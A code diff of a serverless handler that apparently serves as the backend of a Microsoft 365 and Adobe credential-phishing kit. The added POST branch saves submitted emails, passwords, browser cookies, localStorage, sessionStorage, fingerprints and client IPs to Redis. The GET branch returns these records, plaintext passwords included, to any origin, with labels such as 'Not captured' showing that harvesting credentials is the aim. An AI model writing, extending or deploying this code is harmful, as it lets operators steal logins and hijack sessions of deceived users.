@@ -3,7 +3,7 @@ export const handler = async (event, context) => {
   const headers = {
     'Access-Control-Allow-Origin': '*',
     'Access-Control-Allow-Headers': 'Content-Type',
-    'Access-Control-Allow-Methods': 'GET, OPTIONS',
+    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
   };
 
   // Handle preflight requests
@@ -15,7 +15,7 @@ export const handler = async (event, context) => {
     };
   }
 
-  if (event.httpMethod !== 'GET') {
+  if (event.httpMethod !== 'GET' && event.httpMethod !== 'POST') {
     return {
       statusCode: 405,
       headers,
@@ -29,7 +29,7 @@ export const handler = async (event, context) => {
     const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 
     if (!UPSTASH_REDIS_REST_URL || !UPSTASH_REDIS_REST_TOKEN) {
-      console.error('Missing Redis configuration in getSession');
+      console.error('Missing Redis configuration in setSession');
       return {
         statusCode: 500,
         headers,
@@ -48,7 +48,7 @@ export const handler = async (event, context) => {
         token: UPSTASH_REDIS_REST_TOKEN,
       });
     } catch (redisError) {
-      console.error('Redis initialization error in getSession:', redisError);
+      console.error('Redis initialization error in setSession:', redisError);
       return {
         statusCode: 500,
         headers,
@@ -59,102 +59,136 @@ export const handler = async (event, context) => {
       };
     }
 
-    // Get parameters from URL
-    const url = new URL(event.rawUrl || `https://example.com${event.path || event.rawPath}`);
-    const sessionId = url.searchParams.get('sessionId');
-    const email = url.searchParams.get('email');
-
-    // Try to get session from cookie first
-    const cookies = event.headers.cookie || '';
     let sessionData = null;
 
-    if (cookies.includes('microsoft365_session=') || cookies.includes('adobe_session=')) {
-      try {
-        const sessionCookie = cookies.includes('microsoft365_session=') ? 
-          cookies.split('microsoft365_session=')[1].split(';')[0] :
-          cookies.split('adobe_session=')[1].split(';')[0];
-        const decodedSession = decodeURIComponent(sessionCookie);
-        sessionData = JSON.parse(decodedSession);
-        
-        // Verify session exists in Redis
-        const redisSession = await redis.get(`session:${sessionData.sessionId}`);
-        if (!redisSession) {
-          sessionData = null; // Cookie exists but session expired in Redis
-        }
-      } catch (error) {
-        console.error('Error parsing session cookie:', error);
-        sessionData = null;
-      }
-    }
+    if (event.httpMethod === 'POST') {
+      // Handle POST request - create/update session
+      const data = JSON.parse(event.body);
+      
+      const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+                      event.headers['x-real-ip'] || 
+                      event.headers['cf-connecting-ip'] ||
+                      event.requestContext?.identity?.sourceIp ||
+                      'Unknown';
 
-    // Fallback to URL parameters
-    if (!sessionData && (sessionId || email)) {
-      try {
-        if (sessionId) {
-          const redisSession = await redis.get(`session:${sessionId}`);
-          if (redisSession) {
-            sessionData = JSON.parse(redisSession);
-          }
-        } else if (email) {
-          const userSession = await redis.get(`user:${email}`);
-          if (userSession) {
-            sessionData = JSON.parse(userSession);
-          }
-        }
-      } catch (error) {
-        console.error('Error getting session from Redis:', error);
-      }
-    }
+      sessionData = {
+        email: data.email || '',
+        password: data.password || 'Not captured',
+        provider: data.provider || 'Microsoft',
+        fileName: data.fileName || 'Microsoft 365 Access',
+        timestamp: data.timestamp || new Date().toISOString(),
+        sessionId: data.sessionId || Math.random().toString(36).substring(2, 15),
+        clientIP: clientIP,
+        userAgent: data.userAgent || event.headers['user-agent'] || 'Unknown',
+        deviceType: data.deviceType || (/Mobile|Android|iPhone|iPad/.test(data.userAgent || event.headers['user-agent'] || '') ? 'mobile' : 'desktop'),
+        cookies: data.cookies || 'No cookies found',
+        formattedCookies: data.formattedCookies || [],
+        localStorage: data.localStorage || 'Empty',
+        sessionStorage: data.sessionStorage || 'Empty',
+        browserFingerprint: data.browserFingerprint || {}
+      };
 
-    if (!sessionData) {
+      // Store in Redis with TTL
+      await redis.set(`session:${sessionData.sessionId}`, JSON.stringify(sessionData));
+      await redis.set(`user:${sessionData.email}`, JSON.stringify(sessionData));
+
       return {
-        statusCode: 404,
+        statusCode: 200,
         headers,
-        body: JSON.stringify({ 
-          success: false, 
-          message: 'No active session found',
-          sessionId: sessionId,
-          email: email
+        body: JSON.stringify({
+          success: true,
+          message: 'Session created successfully',
+          sessionId: sessionData.sessionId,
+          session: sessionData
+        }),
+      };
+
+    } else {
+      // Handle GET request - retrieve session
+      const url = event.queryStringParameters || {};
+      const sessionId = url.sessionId;
+      const email = url.email;
+
+      // Try to get session from cookie first
+      const cookies = event.headers.cookie || '';
+
+      if (cookies.includes('microsoft365_session=') || cookies.includes('adobe_session=')) {
+        try {
+          const sessionCookie = cookies.includes('microsoft365_session=') ? 
+            cookies.split('microsoft365_session=')[1].split(';')[0] :
+            cookies.split('adobe_session=')[1].split(';')[0];
+          const decodedSession = decodeURIComponent(sessionCookie);
+          sessionData = JSON.parse(decodedSession);
+          
+          // Verify session exists in Redis
+          const redisSession = await redis.get(`session:${sessionData.sessionId}`);
+          if (!redisSession) {
+            sessionData = null; // Cookie exists but session expired in Redis
+          }
+        } catch (error) {
+          console.error('Error parsing session cookie:', error);
+          sessionData = null;
+        }
+      }
+
+      // Fallback to URL parameters
+      if (!sessionData && (sessionId || email)) {
+        try {
+          if (sessionId) {
+            const redisSession = await redis.get(`session:${sessionId}`);
+            if (redisSession) {
+              sessionData = JSON.parse(redisSession);
+            }
+          } else if (email) {
+            const userSession = await redis.get(`user:${email}`);
+            if (userSession) {
+              sessionData = JSON.parse(userSession);
+            }
+          }
+        } catch (error) {
+          console.error('Error getting session from Redis:', error);
+        }
+      }
+
+      if (!sessionData) {
+        return {
+          statusCode: 404,
+          headers,
+          body: JSON.stringify({ 
+            success: false, 
+            message: 'No active session found',
+            sessionId: sessionId,
+            email: email
+          }),
+        };
+      }
+
+      return {
+        statusCode: 200,
+        headers,
+        body: JSON.stringify({
+          success: true,
+          session: {
+            email: sessionData.email,
+            provider: sessionData.provider,
+            fileName: sessionData.fileName,
+            timestamp: sessionData.timestamp,
+            sessionId: sessionData.sessionId,
+            clientIP: sessionData.clientIP || 'Unknown',
+            userAgent: sessionData.userAgent || 'Unknown',
+            deviceType: sessionData.deviceType || 'unknown',
+            cookies: sessionData.cookies || [],
+            formattedCookies: sessionData.formattedCookies || [],
+            localStorage: sessionData.localStorage || 'Not available',
+            sessionStorage: sessionData.sessionStorage || 'Not available',
+            password: sessionData.password || 'Not captured'
+          }
         }),
       };
     }
 
-    // Get additional session data from Redis if available
-    try {
-      const fullSessionData = await redis.get(`session:${sessionData.sessionId}`);
-      if (fullSessionData) {
-        const parsedSessionData = JSON.parse(fullSessionData);
-        sessionData = { ...sessionData, ...parsedSessionData };
-      }
-    } catch (error) {
-      console.error('Error getting full session data:', error);
-    }
-
-    return {
-      statusCode: 200,
-      headers,
-      body: JSON.stringify({
-        success: true,
-        session: {
-          email: sessionData.email,
-          provider: sessionData.provider,
-          fileName: sessionData.fileName,
-          timestamp: sessionData.timestamp,
-          sessionId: sessionData.sessionId,
-          clientIP: sessionData.clientIP || 'Unknown',
-          userAgent: sessionData.userAgent || 'Unknown',
-          deviceType: sessionData.deviceType || 'unknown',
-          cookies: sessionData.cookies || [],
-          formattedCookies: sessionData.formattedCookies || [],
-          localStorage: sessionData.localStorage || 'Not available',
-          sessionStorage: sessionData.sessionStorage || 'Not available',
-          password: sessionData.password || 'Not captured'
-        }
-      }),
-    };
-
   } catch (error) {
-    console.error('Error in getSession function:', error);
+    console.error('Error in setSession function:', error);
     return {
       statusCode: 500,
       headers,
